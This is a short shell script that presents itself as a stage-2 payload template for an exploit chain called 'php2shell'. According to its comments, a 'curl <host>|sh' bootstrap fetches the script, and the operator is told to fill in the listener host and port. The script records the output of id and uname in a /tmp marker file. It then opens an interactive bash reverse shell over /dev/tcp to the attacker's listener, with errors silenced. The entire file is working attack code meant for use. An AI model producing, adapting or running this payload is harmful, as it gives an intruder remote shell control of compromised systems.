#!/bin/sh
# Example stage-2 payload template served by serve_stage2.py and fetched by the
# `curl <host>|sh` bootstrap the main exploit fires (14-byte inline cap).
# Replace LHOST/LPORT with a listener the target can reach, then serve this
# file via `serve_stage2.py --payload ./stage2.sh --port 80`.

LHOST="REPLACE_WITH_LISTENER_HOST"
LPORT="REPLACE_WITH_LISTENER_PORT"

# Mark exec for operator confirmation (optional - delete in real engagements).
id > /tmp/php2shell_marker 2>&1
uname -a >> /tmp/php2shell_marker 2>&1

# Reverse shell via bash /dev/tcp (target needs bash; dash cannot /dev/tcp).
exec bash -c "exec 3<>/dev/tcp/${LHOST}/${LPORT}; cat <&3 | /bin/bash -i >&3 2>&3" 2>/dev/null
